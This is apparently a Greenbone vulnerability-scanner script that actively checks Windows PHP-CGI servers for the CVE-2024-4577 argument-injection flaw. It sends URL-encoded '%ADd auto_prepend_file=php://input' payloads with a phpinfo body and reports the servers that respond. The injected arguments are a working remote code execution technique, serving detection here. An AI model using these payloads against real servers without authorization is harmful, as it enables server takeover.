# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.114652");
  script_version("2025-04-24T05:40:01+0000");
  script_cve_id("CVE-2024-4577", "CVE-2024-5458", "CVE-2024-5585", "CVE-2024-2408");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-24 05:40:01 +0000 (Thu, 24 Apr 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-06-10 12:50:06 +0000 (Mon, 10 Jun 2024)");
  script_tag(name:"creation_date", value:"2024-06-10 10:40:00 +0000 (Mon, 10 Jun 2024)");
  script_name("PHP < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  # nb:
  # - Currently only Windows is known to be affected by the CVE-2024-4577 flaw checked here
  # - Using script_require_keys instead of script_mandatory_keys on purpose so that user can use the
  #   "very deep" scan config to not rely on the detection of the underlying OS
  # - Maybe in 2025 we could change this to a script_mandatory_keys() as the flaw should be then not
  #   that wide spread anymore and our OS detection is also usually quite good for detecting if the
  #   target is running windows
  script_require_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.php.net/ChangeLog-8.php#8.1.29");
  script_xref(name:"URL", value:"https://www.php.net/ChangeLog-8.php#8.2.20");
  script_xref(name:"URL", value:"https://www.php.net/ChangeLog-8.php#8.3.8");
  script_xref(name:"URL", value:"https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv");
  script_xref(name:"URL", value:"https://github.com/php/php-src/security/advisories/GHSA-hh26-4ppw-5864");
  script_xref(name:"URL", value:"https://github.com/php/php-src/security/advisories/GHSA-9fcc-425m-g385");
  script_xref(name:"URL", value:"https://github.com/php/php-src/security/advisories/GHSA-w8qr-v226-r27w");
  script_xref(name:"URL", value:"https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/");
  script_xref(name:"URL", value:"https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html");
  script_xref(name:"URL", value:"https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/");
  script_xref(name:"URL", value:"https://github.com/watchtowrlabs/CVE-2024-4577");
  script_xref(name:"URL", value:"https://people.redhat.com/~hkario/marvin/");
  script_xref(name:"URL", value:"https://blog.talosintelligence.com/new-persistent-attacks-japan/");
  script_xref(name:"URL", value:"https://www.bitdefender.com/en-us/blog/businessinsights/technical-advisory-update-mass-exploitation-cve-2024-4577");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"PHP is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send multiple a crafted HTTP POST requests and checks the
  responses.

  Notes:

  - This script checks for the presence of CVE-2024-4577 which indicates that the system is also
  affected by the other included CVEs

  - Only Windows systems are known to be affected by CVE-2024-4577 and thus this script only runs
  against Windows systems by default");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2024-4577: Argument injection in PHP-CGI (bypass of CVE-2012-1823)

  - CVE-2024-5458: Filter bypass in filter_var FILTER_VALIDATE_URL

  - CVE-2024-5585: Bypass of CVE-2024-1874

  - CVE-2024-2408: Marvin attack in OpenSSL");

  script_tag(name:"affected", value:"PHP prior to version 8.1.29, version 8.2.x through 8.2.19 and
  8.3.x through 8.3.7.

  Other products / applications might be affected by the tested CVE-2024-4577 as well.");

  script_tag(name:"solution", value:"- PHP: Update to version 8.1.29, 8.2.20, 8.3.8 or later

  - Other products / applications: Please contact the vendor for a solution");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  script_timeout(600);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( dont_add_port:TRUE );
_phps = http_get_kb_file_extensions( port:port, host:host, ext:"php" );

if( ! isnull( _phps ) ) {
  _phps = make_list( "/", "/index.php", _phps );
} else {
  _phps = make_list( "/", "/index.php" );
}

# nb: Unlikely that a system is using/exposing such .exe files these days so only throw these
# against systems which we definitely know that they are Windows ones.
if( os_host_runs( "windows" ) == "yes" ) {
  foreach cgi_dir( make_list( "", "/cgi-bin", "/cgi", "/php-cgi" ) ) {
    _phps = make_list(
    cgi_dir + "/php-cgi.exe",
    cgi_dir + "/php.exe",
    _phps );
  }
}

_phps = make_list_unique( _phps );

# nb: False positive prevention (e.g. if the "/index.php" or any other detected .php file is
# exposing the phpinfo() output directly)
phpinfos = get_kb_list( "php/phpinfo/" + host + "/" + port + "/detected_urls" );
phps = make_list();
if( phpinfos ) {
  foreach p( _phps ) {
    exist = FALSE;
    foreach pi( phpinfos ) {
      if( p == pi )
        exist = TRUE;
      break;
    }
    if( ! exist )
      phps = make_list( phps, p );
  }
} else {
  phps = _phps;
}

# nb:
# - Max amount of files to check
# - Our "_phps" list has (currently) at least 15 entries so we use a little bit more then this as
#   the current max checks so that we at least test all known defaults
max_done_checks  = 15;
curr_done_checks = 0;

post_data = "<?php phpinfo();?>";

# nb:
# - The "%AD" is the bypass for the "-" migitation for CVE-2012-1823. There is currently some mixed
#   usage seen:
#   1. watchTowr Labs based PoC is only using it on the first occurrence of "-d"
#   2. watchTowr Labs Blog post shows that it is used on each occurrence of a "-d"
#   To be sure that we're not missing something the second option has been used below
# - CVE-2012-1823 is already separately tested in / via 2012/gb_php_cgi_2012.nasl
# - In the past / in older PoCs (like for CVE-2012-1823) an "on" was used for "allow_url_include"
#   but the following says it is a bool:
#   > https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include
#   Might be possible that PHP is supporting / had supported both but for now we're using the bool
#   just to be sure that we're catching the recent affected ones
# - allow_url_include seems to be deprecated since PHP 7.4 which should be kept in mind:
#   > https://www.php.net/manual/en/migration74.deprecated.php#migration74.deprecated.core.allow-url-include
# - The second is an additional variant mentioned in 2012/gb_php_cgi_2012.nasl but trimmed down a
#   little (e.g. safe_mode has been removed in PHP 5.4.0 and Suhosin is also no longer available so
#   it didn't made sense to include these here / for newer PHP versions)
#
# -d allow_url_include=1 -d auto_prepend_file=php://input
post_urls[i++] = "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input";
#
# -d allow_url_include=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -n
post_urls[i++] = "%ADd+allow_url_include%3d1+%ADd+disable_functions%3d%22%22+%ADd+open_basedir%3dnone+%ADd+auto_prepend_file%3dphp://input+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADn";

foreach php( phps ) {
  foreach post_url( post_urls ) {

    url = php + "?" + post_url;
    req = http_post_put_req( port:port, url:url, data:post_data, add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
    if( ! res )
      continue;

    if( found = http_check_for_phpinfo_output( data:res ) ) {

      info['"HTTP POST" body'] = post_data;
      info["URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );

      report  = 'By doing the following HTTP POST request:\n\n';
      report += text_format_table( array:info ) + '\n\n';
      report += 'it was possible to execute the "' + post_data + '" command.';
      report += '\n\nResult:\n' + chomp( found );

      expert_info = 'Request:\n'+ req + 'Response:\n' + res;
      security_message( port:port, data:report, expert_info:expert_info );
      exit( 0 );
    }
  }

  curr_done_checks++;
  if( curr_done_checks > max_done_checks )
    exit( 99 );
}

exit( 99 );
